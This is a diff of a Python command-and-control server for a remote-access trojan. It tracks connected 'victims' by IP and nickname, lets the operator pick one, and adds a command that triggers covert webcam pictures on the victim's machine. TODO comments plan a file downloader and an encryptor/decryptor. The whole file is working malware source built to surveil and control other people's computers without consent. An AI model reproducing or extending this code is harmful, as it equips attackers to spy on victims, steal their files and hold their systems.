@@ -1,10 +1,10 @@
-
 import socket
 import threading
-import sqlite3
-import pickle
 import time
 
+from colorama import Fore, Back, Style
+
+from database import *
 # Local imports
 from other_func import *
 
@@ -12,42 +12,28 @@ HOST = ''
 CMD_PORT = 55555
 DATA_PORT = 44444
 
-# Todo: Change variable names to more relevant names
-# Todo: Properly comment code
-
-# Todo: Add webcam snap
-# Todo: Fix user selection
-# Todo: CLEAN CODE
+# Todo: Make a file downloader (3)
+# Todo: Make an encryptor/decryptor (4)
+# Todo: Add webcam snap (2)
+# Todo: split program in multiple local imports (1)
 
 
 class ChooseToAttack(object):
     # selected_user, users_online[x] => [IP, PORT, CMD_CONN, DATA_CONN] * reference
 
     def __init__(self):
-        self.selected_user = {}  # Dict with data of selected victim.
-        self.users_online = {}  # A dict containing lists, each list contain user specific data.
+        self.selected_user = {}
+        self.users_online = {}
         self.online_size = len(self.users_online.keys())
-        # We use this to check if the length of users_online has changed when the script is running.
-        # With online_size being the old/current size and comparing it with len(users_online) we see
-        # if any new connections have been made.
-
         self.buffer = 1024
-        # The max size of each TCP packet we are sending, this value is the same on the client script.
-
         self.switch = True
-        # We use this as a switch to shut down parts of the script so we can forwards and backwards.
         self.refresh_sc = True
-        # If new data/errors come to us we refresh our screen and reprint our updated data structures.
         self.printing_done = bool
         self.printing_anim = True
-        # Boolean variables related to our console screen printing.
         self.input_thread = True
-        # TO ADD FOR INPUT THREAD
         self.database = ManageDB()
-        # class object that we use to manage our database.
 
     def get_connections(self):
-        # Thread running here forever.
         while True:
             cmd_conn, addr = cmd_sock.accept()
             data_conn, _ = data_sock.accept()
@@ -104,20 +90,20 @@ class ChooseToAttack(object):
                             time.sleep(0.1)
                             print(line, end='')
                         else:
-                            print(line, end='')
+                            print(f'{Fore.GREEN}{line}{Style.RESET_ALL}' , end='')
 
                     self.printing_anim = False
                 else:
-                    print(ascii_logo, end='')
+                    print(f'{Fore.GREEN}{ascii_logo}{Style.RESET_ALL}', end='')
 
-                rename_desc = " - Type 'rename' to rename a victim!"
-                select_desc = " - Type the name of the victim you want to select!"
+                rename_desc = f" - Type '{Fore.YELLOW}rename{Style.RESET_ALL}' to rename a victim!"
+                select_desc = f" - Type the {Fore.YELLOW}name{Style.RESET_ALL} of the victim you want to select!"
 
                 print(beautify(rename_desc, '=', 'top', len(select_desc)))
                 print(beautify(select_desc, '=', 'bottom'), end='\n\n')
 
                 for victim in self.users_online:
-                    print(f" [+] {victim} [+] connected on \"{self.users_online[victim][0]}\"")
+                    print(f" [+] {Back.BLUE}{victim}{Style.RESET_ALL} [+] connected on \"{Fore.BLUE}{self.users_online[victim][0]}\"{Style.RESET_ALL}")
 
                 self.printing_done = True
 
@@ -167,19 +153,20 @@ class ChooseToAttack(object):
 
 
 class ExecuteCMD(object):
-
     def __init__(self, victim_data):
-        self.victim_data = victim_data
         self.switch = True
         self.input_thread = True
         self.refresh_sc = True
         self.printing_done = False
         self.offline = False
+        self.victim_data = victim_data
         self.real_name = list(self.victim_data.keys())[0]
+        self.cmd_conn = self.victim_data[self.real_name][2]
+        self.data_conn = self.victim_data[self.real_name][3]
 
         self.run_cmd = {
-            'take picture': ['Take (x) pictures every (y) seconds', self.take_pictures],
-            'back': ['Go back to victim selection', self.back]}
+            'Take picture': ['Take (x) pictures every (y) seconds', self.take_pictures],
+            'Back': ['Go back to victim selection', self.back]}
 
     def pick_command(self):
         while self.switch:
@@ -188,13 +175,13 @@ class ExecuteCMD(object):
                 self.refresh_sc = False
                 clear_screen()
 
-                print(ascii_cmd)
-                print(f' Type the name of the command you want to use on [{self.real_name}]\n')
-                print(beautify(" command/description", '~'))
+                print(f'{Fore.YELLOW}{ascii_cmd}{Style.RESET_ALL}')
+                print(f' Type the name of the command you want to use on [{Back.BLUE}{self.real_name}{Style.RESET_ALL}]\n')
+                print(beautify(f" {Fore.GREEN}command{Style.RESET_ALL}/{Fore.BLUE}description{Style.RESET_ALL}", '~'))
                 print('\n', end='')
 
                 for cmd in self.run_cmd:
-                    print(f" {cmd} <cmd--desc> {self.run_cmd[cmd][0]}")
+                    print(f" {cmd} <{Fore.GREEN}cmd{Style.RESET_ALL}--{Fore.BLUE}desc{Style.RESET_ALL}> {self.run_cmd[cmd][0]}")
 
                 self.printing_done = True
 
@@ -203,10 +190,10 @@ class ExecuteCMD(object):
                     inp_thread = threading.Thread(target=self.get_input)
                     inp_thread.start()
 
-    def get_input(self):  # buggy
+    def get_input(self):
         while self.switch:
             if self.printing_done:
-                command = input("\n CMD: ")
+                command = input(f"\n {Fore.GREEN}CMD{Style.RESET_ALL}: ")
                 self.printing_done = False
 
                 if self.offline:
@@ -223,10 +210,14 @@ class ExecuteCMD(object):
                         self.switch = False
                         break
 
+                    elif output == 'take picture':
+                        self.take_pictures()
+
                 self.refresh_sc = True
 
     def take_pictures(self):
-        pass
+        self.cmd_conn.send('take picture'.encode('utf-8'))
+        # print(data_downloader(self.data_conn))
 
     def back(self):
         self.switch = False
@@ -240,42 +231,12 @@ class ExecuteCMD(object):
                 break
 
 
-class ManageDB(object):
-
-    def __init__(self):
-        self.conn = sqlite3.connect("database.db", check_same_thread=False)
-        self.cursor = self.conn.cursor()
-        self.create_table()
-
-    def find(self, ip):
-        self.cursor.execute("SELECT nickname FROM victims WHERE ip=?", (ip,))
-        return self.cursor.fetchone()
-
-    def insert(self, nick, ip):
-        self.cursor.execute("INSERT INTO victims VALUES (?, ?)", (nick, ip))
-        self.conn.commit()
-
-    def update(self, new, old):
-        self.cursor.execute("UPDATE victims SET nickname=? WHERE nickname=?", (new, old))
-        self.conn.commit()
-
-    def create_table(self):
-        try:
-            self.cursor.execute("""CREATE TABLE victims (nickname TEXT UNIQUE, ip TEXT UNIQUE)""")
-            self.conn.commit()
-
-        except sqlite3.OperationalError:
-            # Table is already created!
-            pass
-
-
 if __name__ == '__main__':
 
     cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cmd_sock.bind((HOST, CMD_PORT))
     data_sock.bind((HOST, DATA_PORT))
-
     cmd_sock.listen(5)
     data_sock.listen(5)
 
